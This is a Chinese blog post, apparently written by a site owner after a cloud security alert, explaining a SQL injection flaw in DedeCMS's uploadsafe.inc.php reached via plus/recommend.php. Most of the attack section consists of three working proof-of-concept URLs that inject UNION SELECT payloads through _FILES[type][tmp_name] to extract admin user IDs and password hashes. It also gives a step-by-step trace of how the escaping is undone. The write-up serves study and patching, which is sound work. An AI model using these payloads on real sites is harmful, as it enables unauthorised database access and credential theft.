<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>dedecms上传漏洞uploadsafe.inc.php 整理 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="dedecms上传漏洞uploadsafe.inc.php 整理" />
<meta property="og:description" content="自从买了阿里云的ecs 之后每次出现漏洞阿里云盾就会通知，前段时间部署的项目检测出上传漏洞
根据网上大神们的博客整理了下，下面这个是可行的
dedecms上传漏洞uploadsafe.inc.php，这里整理了大神们对于这个漏洞的解释
1. 漏洞描述 1. dedecms原生提供一个&#34;本地变量注册&#34;的模拟实现，原则上允许黑客覆盖任意变量 2. dedecms在实现本地变量注册的时候，会对$_GET、$_POST、$_COOKIE等的value值进行addslash转移过滤处理 //$key值注入不在本文讨论范围内，详情参阅：http://www.cnblogs.com/LittleHann/p/4505694.html 3. 在处理文件上传的逻辑中，存在一条攻击路径，程序自己&#34;反处理&#34;了addslash逻辑，使用于闭合的单引号重新获得攻击效果，造成SQL注入 Relevant Link: http://0day5.com/archives/1346 2. 漏洞触发条件
0x1: POC1 plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)&#43;from&#43;`%23@__admin`%20limit&#43;0,1),5,6,7,8,9%23@`\%27`&#43;&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=4294 ?action= &amp;aid=1 &amp;_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)&#43;from&#43;`%23@__admin`%20limit&#43;0,1),5,6,7,8,9%23@`\%27`&#43; &amp;_FILES[type][name]=1.jpg &amp;_FILES[type][type]=application/octet-stream &amp;_FILES[type][size]=4294 0x2: POC2 http://DEDD/plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\&#39; or mid=@`\&#39;` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd)&#43;from&#43;`%23@__admin` limit&#43;0,1),5,6,7,8,9%23@`\&#39;`&#43;&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=6873 0x3: POC3 http://DEDE/plus/recommend.php?aid=1&amp;_FILES[type][name]&amp;_FILES[type][size]&amp;_FILES[type][type]&amp;_FILES[type][tmp_name]=aa\&#39;and&#43;char(@`&#39;`)&#43;/*!50000Union*/&#43;/*!50000SeLect*/&#43;1,2,3,group_concat(userid,0x23,pwd),5,6,7,8,9 from `%23@__admin`%23 0x4: POC入侵方式 1. 原始数据 \%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)&#43;from&#43;`%23@__admin`%20limit&#43;0,1),5,6,7,8,9%23@`\%27`&#43; 2.URL提交进来后，\ 和 ’ 分别被转义成 \\ 和 \’ \\\&#39; or mid=@`\\\&#39;`/*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd) from`#@__admin` limit 0,1),5,6,7,8,9#@`\\\&#39;` 3.URL被带入include/common.inc.php中检查，此步数据未发生变化 4.然后来到了include/uploadsafe.inc.php中，经过第行str_replace后，\\被过滤成了\，用于攻击闭合的单引号重新获得攻击能力 $$_key = $_FILES[$_key][&#39;tmp_name&#39;] =str_replace(&#34;\\\\&#34;, &#34;\\&#34;, $_FILES[$_key][&#39;tmp_name&#39;]); \\&#39; or mid=@`\\&#39;`/*!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/685b791625c19e491179cd3d8e8434fb/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2016-09-06T11:50:33+08:00" />
<meta property="article:modified_time" content="2016-09-06T11:50:33+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">dedecms上传漏洞uploadsafe.inc.php 整理</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p style="margin-top:0px; margin-bottom:22px; padding-top:0px; padding-bottom:0px; color:rgb(51,51,51); font-family:'Microsoft Yahei',Simsun; font-size:17px; line-height:28px"> 自从买了阿里云的ecs 之后每次出现漏洞阿里云盾就会通知，前段时间部署的项目检测出上传漏洞</p> 
<p style="margin-top:0px; margin-bottom:22px; padding-top:0px; padding-bottom:0px; color:rgb(51,51,51); font-family:'Microsoft Yahei',Simsun; font-size:17px; line-height:28px"> 根据网上大神们的博客整理了下，下面这个是可行的</p> 
<p style="margin-top:0px; margin-bottom:22px; padding-top:0px; padding-bottom:0px; color:rgb(51,51,51); font-family:'Microsoft Yahei',Simsun; font-size:17px; line-height:28px"> dedecms上传漏洞uploadsafe.inc.php，这里整理了大神们对于这个漏洞的解释</p> 
<p style="margin-top:0px; margin-bottom:22px; padding-top:0px; padding-bottom:0px; color:rgb(51,51,51); font-family:'Microsoft Yahei',Simsun; font-size:17px; line-height:28px"> <br> </p> 
<p style="margin-top:0px; margin-bottom:22px; padding-top:0px; padding-bottom:0px; color:rgb(51,51,51); font-family:'Microsoft Yahei',Simsun; font-size:17px; line-height:28px"> </p> 
<h5 style="margin:0px 0px 0.5em; font-family:'Helvetica Neue',Helvetica,Tahoma,Arial,STXihei,'Microsoft YaHei',微软雅黑,sans-serif; line-height:27.2px; color:rgb(51,51,51); font-size:16px; text-indent:1em; background-color:rgb(254,254,254)"> 1. 漏洞描述</h5> 
<pre><code class="language-ruby"><span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">1</span></span>. dedecms原生提供一个<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">本地变量注册</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">的模拟实现，原则上允许黑客覆盖任意变量
</span><span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">2</span></span><span style="color:rgb(0,0,0)">. dedecms在实现本地变量注册的时候，会对<span class="variable" style="color:rgb(0,128,128)">$_GET</span>、<span class="variable" style="color:rgb(0,128,128)">$_POST</span>、<span class="variable" style="color:rgb(0,128,128)">$_COOKIE</span>等的value值进行addslash转移过滤处理
</span><span style="color:rgb(0,128,0)">/<span class="regexp" style="color:rgb(0,153,38)">/</span></span><span class="regexp" style="color:rgb(0,153,38)"><span style="color:rgb(0,128,0)">$key值注入不在本文讨论范围内，详情参阅：</span><span style="color:rgb(0,128,0)"><u>http:/</u></span></span><span style="color:rgb(0,128,0)"><u><span class="regexp" style="color:rgb(0,153,38)">/www.cnblogs.com/</span><span class="constant">LittleHann</span>/p/<span class="number" style="color:rgb(0,153,153)">4505694</span>.html</u></span>
<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">3</span></span>. 在处理文件上传的逻辑中，存在一条攻击路径，程序自己<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">反处理</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span>了addslash逻辑，使用于闭合的单引号重新获得攻击效果，造成<span class="constant">SQL</span>注入</code></pre> 
<h5 style="margin:0px 0px 0.5em; font-family:'Helvetica Neue',Helvetica,Tahoma,Arial,STXihei,'Microsoft YaHei',微软雅黑,sans-serif; line-height:27.2px; color:rgb(51,51,51); font-size:16px; text-indent:1em; background-color:rgb(254,254,254)"> Relevant Link:</h5> 
<pre><code class="language-ruby"><span class="symbol" style="color:rgb(153,0,115)">http:</span><span style="color:rgb(0,128,0)">/<span class="regexp" style="color:rgb(0,153,38)">/</span></span><span class="regexp" style="color:rgb(0,153,38)"><span style="color:rgb(0,128,0)">0day5.com/archives</span></span><span style="color:rgb(0,128,0)"><span class="regexp" style="color:rgb(0,153,38)">/1346</span></span></code></pre> 
<p></p> 
<p style="margin-top:0px; margin-bottom:0.75em; font-size:16px; line-height:27.2px; text-indent:1em; color:rgb(51,51,51); font-family:'Helvetica Neue',Helvetica,Tahoma,Arial,STXihei,'Microsoft YaHei',微软雅黑,sans-serif; background-color:rgb(254,254,254)"> 2. 漏洞触发条件</p> 
<h5 style="margin:0px 0px 0.5em; font-family:'Helvetica Neue',Helvetica,Tahoma,Arial,STXihei,'Microsoft YaHei',微软雅黑,sans-serif; line-height:27.2px; color:rgb(51,51,51); font-size:16px; text-indent:1em; background-color:rgb(254,254,254)"> 0x1: POC1</h5> 
<pre><code class="language-sql">plus/recommend.php?action=&amp;aid=<span style="color:rgb(128,0,128)">1</span>&amp;_FILES[type][tmp_name]=\%<span style="color:rgb(128,0,128)">27</span>%20or%20mid=@`\%<span style="color:rgb(128,0,128)">27</span>`%<span style="color:rgb(128,0,128)">20</span><span style="color:rgb(0,128,0)"><span class="comment" style="color:rgb(153,153,136); font-style:italic">/*</span></span><span class="comment" style="color:rgb(153,153,136); font-style:italic"><span style="color:rgb(0,128,0)">!50000union</span><span style="color:rgb(0,128,0)">*/</span></span><span style="color:rgb(0,128,0)"><span class="comment" style="color:rgb(153,153,136); font-style:italic">/*</span></span><span class="comment" style="color:rgb(153,153,136); font-style:italic"><span style="color:rgb(0,128,0)">!50000select</span><span style="color:rgb(0,128,0)">*/</span></span><span style="color:rgb(0,128,0)"></span><span style="color:rgb(128,0,128)">1</span>,<span style="color:rgb(128,0,128)">2</span>,<span style="color:rgb(128,0,128)">3</span>,(<span style="color:rgb(0,0,255)"><span class="operator"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">select</span></span></span><span class="operator">%<span class="number" style="color:rgb(0,153,153)">20</span>CONCAT(<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">0x7c</span></span>,userid,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">0x7c</span></span>,pwd)+<span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">from</span></span>+<span class="string" style="color:rgb(221,17,68)">`%<span style="color:rgb(128,0,128)">23</span>@__admin`</span>%<span class="number" style="color:rgb(0,153,153)">20</span>limit+<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">0</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">1</span></span>),<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">5</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">6</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">7</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">8</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">9</span></span>%<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">23</span></span>@<span class="string" style="color:rgb(221,17,68)">`\%<span style="color:rgb(128,0,128)">27</span>`</span>+&amp;_FILES[type][name]=<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">1</span></span><span class="number" style="color:rgb(0,153,153)">.</span>jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][<span class="keyword" style="font-weight:bold">size</span>]=<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">4294</span></span>

?<span class="keyword" style="font-weight:bold">action</span>=
&amp;aid=<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">1</span></span>
&amp;_FILES[type][tmp_name]=\%<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">27</span></span>%<span class="number" style="color:rgb(0,153,153)">20</span><span class="keyword" style="font-weight:bold">or</span>%<span class="number" style="color:rgb(0,153,153)">20</span>mid=@<span class="string" style="color:rgb(221,17,68)">`\%<span style="color:rgb(128,0,128)">27</span>`</span>%<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">20</span></span><span style="color:rgb(0,128,0)">/*</span><span style="color:rgb(0,128,0)">!<span class="number" style="color:rgb(0,153,153)">50000</span><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">union</span></span><span style="color:rgb(0,128,0)">*//*</span><span style="color:rgb(0,128,0)">!<span class="number" style="color:rgb(0,153,153)">50000</span><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">select</span></span><span style="color:rgb(0,128,0)">*/</span><span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">1</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">2</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">3</span></span>,(<span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">select</span></span>%<span class="number" style="color:rgb(0,153,153)">20</span>CONCAT(<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">0x7c</span></span>,userid,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">0x7c</span></span>,pwd)+<span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">from</span></span>+<span class="string" style="color:rgb(221,17,68)">`%<span style="color:rgb(128,0,128)">23</span>@__admin`</span>%<span class="number" style="color:rgb(0,153,153)">20</span>limit+<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">0</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">1</span></span>),<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">5</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">6</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">7</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">8</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">9</span></span>%<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">23</span></span>@<span class="string" style="color:rgb(221,17,68)">`\%<span style="color:rgb(128,0,128)">27</span>`</span>+
&amp;_FILES[type][name]=<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">1</span></span><span class="number" style="color:rgb(0,153,153)"><span style="color:rgb(0,0,0)">.</span></span><span style="color:rgb(0,0,0)">jpg
</span>&amp;_FILES[type][type]=application/octet-<span style="color:rgb(0,0,0)">stream
</span>&amp;_FILES[type][<span class="keyword" style="font-weight:bold">size</span>]=<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">4294</span></span></span><span style="color:rgb(128,0,128)"></span></code></pre> 
<h5 style="margin:0px 0px 0.5em; font-family:'Helvetica Neue',Helvetica,Tahoma,Arial,STXihei,'Microsoft YaHei',微软雅黑,sans-serif; line-height:27.2px; color:rgb(51,51,51); font-size:16px; text-indent:1em; background-color:rgb(254,254,254)"> 0x2: POC2</h5> 
<pre><code class="language-sql">http:<span style="color:rgb(0,128,0)">//</span><span style="color:rgb(0,128,0)">DEDD/plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\'  or mid=@`\'` <span class="comment" style="color:rgb(153,153,136); font-style:italic">/*!50000union*</span></span><span class="comment" style="color:rgb(153,153,136); font-style:italic"><span style="color:rgb(0,128,0)">/</span></span><span style="color:rgb(0,128,0)"><span class="comment" style="color:rgb(153,153,136); font-style:italic">/</span></span><span class="comment" style="color:rgb(153,153,136); font-style:italic"><span style="color:rgb(0,128,0)">*!50000select*/</span></span><span style="color:rgb(0,128,0)">1,2,3,(<span class="operator"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">select</span> CONCAT(<span class="number" style="color:rgb(0,153,153)">0x7c</span>,userid,<span class="number" style="color:rgb(0,153,153)">0x7c</span>,pwd)+<span class="keyword" style="color:rgb(51,51,51); font-weight:bold">from</span>+<span class="string" style="color:rgb(221,17,68)">`%23@__admin`</span> limit+<span class="number" style="color:rgb(0,153,153)">0</span>,<span class="number" style="color:rgb(0,153,153)">1</span>),<span class="number" style="color:rgb(0,153,153)">5</span>,<span class="number" style="color:rgb(0,153,153)">6</span>,<span class="number" style="color:rgb(0,153,153)">7</span>,<span class="number" style="color:rgb(0,153,153)">8</span>,<span class="number" style="color:rgb(0,153,153)">9</span>%<span class="number" style="color:rgb(0,153,153)">23</span>@<span class="string" style="color:rgb(221,17,68)">`\'`</span>+&amp;_FILES[type][name]=<span class="number" style="color:rgb(0,153,153)">1.</span>jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][<span class="keyword" style="color:rgb(51,51,51); font-weight:bold">size</span>]=<span class="number" style="color:rgb(0,153,153)">6873</span></span></span></code></pre> 
<h5 style="margin:0px 0px 0.5em; font-family:'Helvetica Neue',Helvetica,Tahoma,Arial,STXihei,'Microsoft YaHei',微软雅黑,sans-serif; line-height:27.2px; color:rgb(51,51,51); font-size:16px; text-indent:1em; background-color:rgb(254,254,254)"> 0x3: POC3</h5> 
<pre><code class="language-ruby"><span class="symbol" style="color:rgb(153,0,115)">http:</span><span style="color:rgb(0,128,0)">/<span class="regexp" style="color:rgb(0,153,38)">/DEDE</span></span><span class="regexp" style="color:rgb(0,153,38)"><span style="color:rgb(0,128,0)">/plus</span></span><span style="color:rgb(0,128,0)"><span class="regexp" style="color:rgb(0,153,38)">/recommend.php?aid=1&amp;_FILES[type][name]&amp;_FILES[type][size]&amp;_FILES[type][type]&amp;_FILES[type][tmp_name]=aa\'and+char(@`'`)+/</span>*!<span class="number" style="color:rgb(0,153,153)">50000</span>Union*<span class="regexp" style="color:rgb(0,153,38)">/+/</span>*!<span class="number" style="color:rgb(0,153,153)">50000</span>SeLect*<span class="regexp" style="color:rgb(0,153,38)">/+1,2,3,group_concat(userid,0x23,pwd),5,6,7,8,9 from `%23@__admin`%23</span></span></code></pre> 
<p style="margin-top:0px; margin-bottom:0.75em; font-size:16px; line-height:27.2px; text-indent:1em; color:rgb(51,51,51); font-family:'Helvetica Neue',Helvetica,Tahoma,Arial,STXihei,'Microsoft YaHei',微软雅黑,sans-serif; background-color:rgb(254,254,254)"> <em>0x4: POC入侵方式</em> <br> </p> 
<pre><code class="language-sql"><span style="color:rgb(128,0,128)">1</span><span style="color:rgb(0,0,0)">. 原始数据
\</span>%<span style="color:rgb(128,0,128)">27</span>%20or%20mid=@`\%<span style="color:rgb(128,0,128)">27</span>`%<span style="color:rgb(128,0,128)">20</span><span style="color:rgb(0,128,0)"><span class="comment" style="color:rgb(153,153,136); font-style:italic">/*</span></span><span class="comment" style="color:rgb(153,153,136); font-style:italic"><span style="color:rgb(0,128,0)">!50000union</span><span style="color:rgb(0,128,0)">*/</span></span><span style="color:rgb(0,128,0)"><span class="comment" style="color:rgb(153,153,136); font-style:italic">/*</span></span><span class="comment" style="color:rgb(153,153,136); font-style:italic"><span style="color:rgb(0,128,0)">!50000select</span><span style="color:rgb(0,128,0)">*/</span></span><span style="color:rgb(0,128,0)"></span><span style="color:rgb(128,0,128)">1</span>,<span style="color:rgb(128,0,128)">2</span>,<span style="color:rgb(128,0,128)">3</span>,(<span style="color:rgb(0,0,255)"><span class="operator"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">select</span></span></span><span class="operator">%<span class="number" style="color:rgb(0,153,153)">20</span>CONCAT(<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">0x7c</span></span>,userid,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">0x7c</span></span>,pwd)+<span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">from</span></span>+<span class="string" style="color:rgb(221,17,68)">`%<span style="color:rgb(128,0,128)">23</span>@__admin`</span>%<span class="number" style="color:rgb(0,153,153)">20</span>limit+<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">0</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">1</span></span>),<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">5</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">6</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">7</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">8</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">9</span></span>%<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">23</span></span>@<span class="string" style="color:rgb(221,17,68)">`\%<span style="color:rgb(128,0,128)">27</span>`</span>+

<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">2</span></span><span class="number" style="color:rgb(0,153,153)"><span style="color:rgb(0,0,0)">.</span></span><span style="color:rgb(0,0,0)">URL提交进来后，\ 和 ’ 分别被转义成 \\ 和 \’
\\\</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)"> or mid=@`\\\'`/*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd) from`#@__admin` limit 0,1),5,6,7,8,9#@`\\\'`</span>

<span style="color:rgb(128,0,128)">3</span>.URL被带入include/<span style="color:rgb(0,0,0)">common.inc.php中检查，此步数据未发生变化

</span><span style="color:rgb(128,0,128)">4</span>.然后来到了include/<span style="color:rgb(0,0,0)">uploadsafe.inc.php中，经过第行str_replace后，\\被过滤成了\，用于攻击闭合的单引号重新获得攻击能力
$$_key </span>= $_FILES[$_key][<span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(128,0,0)">tmp_name</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)">] =str_replace(<span style="color:rgb(128,0,0)">"</span><span style="color:rgb(128,0,0)">\\\\</span><span style="color:rgb(128,0,0)">"</span>, <span style="color:rgb(128,0,0)">"</span><span style="color:rgb(128,0,0)">\\</span><span style="color:rgb(128,0,0)">"</span>, $_FILES[$_key][<span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(128,0,0)">tmp_name</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(0,0,0)">]);
\\</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(128,0,0)"> <span class="keyword" style="color:rgb(51,51,51); font-weight:bold">or</span> mid=@<span class="string" style="color:rgb(221,17,68)">`\\</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">'</span>`</span><span style="color:rgb(0,128,0)">/*</span><span style="color:rgb(0,128,0)">!<span class="number" style="color:rgb(0,153,153)">50000</span><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">union</span></span><span style="color:rgb(0,128,0)">*//*</span><span style="color:rgb(0,128,0)">!<span class="number" style="color:rgb(0,153,153)">50000</span><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">select</span></span><span style="color:rgb(0,128,0)">*/</span><span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">1</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">2</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">3</span></span>,(<span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">select</span></span> CONCAT(<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">0x7c</span></span>,userid,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">0x7c</span></span>,pwd) <span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">from</span></span><span class="string" style="color:rgb(221,17,68)">`#@__admin`</span> limit <span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">0</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">1</span></span>),<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">5</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">6</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">7</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">8</span></span>,<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">9</span></span>#@<span class="string" style="color:rgb(221,17,68)">`\\<span style="color:rgb(128,0,0)">'</span><span style="color:rgb(128,0,0)">`</span></span><span style="color:rgb(128,0,0)"></span>
<span style="color:rgb(0,0,0)">此时引号被成功的带入了查询语句中

</span><span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">5</span></span><span class="number" style="color:rgb(0,153,153)">.</span>回到plus/<span style="color:rgb(0,0,0)">recommend.php中，第<span class="number" style="color:rgb(0,153,153)">38</span>行，此时<span class="keyword" style="color:rgb(51,51,51); font-weight:bold">SQL</span>语句被拼成如下：
<span class="keyword" style="color:rgb(51,51,51); font-weight:bold">SELECT</span> s.</span>*,t.* <span class="keyword" style="font-weight:bold">FROM</span> <span class="string" style="color:rgb(221,17,68)">`#@_member_stow`</span> <span class="keyword" style="font-weight:bold">AS</span> sLEFT <span class="keyword" style="font-weight:bold">JOIN</span> <span class="string" style="color:rgb(221,17,68)">`#@__member_stowtype`</span> <span class="keyword" style="font-weight:bold">AS</span> t <span class="keyword" style="font-weight:bold">ON</span> s.type=t.stowname <span class="keyword" style="font-weight:bold">WHERE</span> s.aid=<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">1</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span> ANDs.type=<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">\\</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span> <span class="keyword" style="font-weight:bold">or</span> mid=@<span class="string" style="color:rgb(221,17,68)">`\\<span style="color:rgb(128,0,0)">'</span><span style="color:rgb(128,0,0)">`</span></span><span style="color:rgb(128,0,0)"> /*!<span class="number" style="color:rgb(0,153,153)">50000</span><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">union</span>*//*!<span class="number" style="color:rgb(0,153,153)">50000</span><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">select</span>*/<span class="number" style="color:rgb(0,153,153)">1</span>,<span class="number" style="color:rgb(0,153,153)">2</span>,<span class="number" style="color:rgb(0,153,153)">3</span>,(selectCONCAT(<span class="number" style="color:rgb(0,153,153)">0x7c</span>,userid,<span class="number" style="color:rgb(0,153,153)">0x7c</span>,pwd) <span class="keyword" style="color:rgb(51,51,51); font-weight:bold">from</span> <span class="string" style="color:rgb(221,17,68)">`#@__admin`</span> limit <span class="number" style="color:rgb(0,153,153)">0</span>,<span class="number" style="color:rgb(0,153,153)">1</span>),<span class="number" style="color:rgb(0,153,153)">5</span>,<span class="number" style="color:rgb(0,153,153)">6</span>,<span class="number" style="color:rgb(0,153,153)">7</span>,<span class="number" style="color:rgb(0,153,153)">8</span>,<span class="number" style="color:rgb(0,153,153)">9</span>#@<span class="string" style="color:rgb(221,17,68)">`\\</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">'</span>`</span> <span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span></span><span style="color:rgb(128,0,0)"></span></code></pre> 
<h5 style="margin:0px 0px 0.5em; font-family:'Helvetica Neue',Helvetica,Tahoma,Arial,STXihei,'Microsoft YaHei',微软雅黑,sans-serif; line-height:27.2px; color:rgb(51,51,51); font-size:16px; text-indent:1em; background-color:rgb(254,254,254)"> Relevant Link:</h5> 
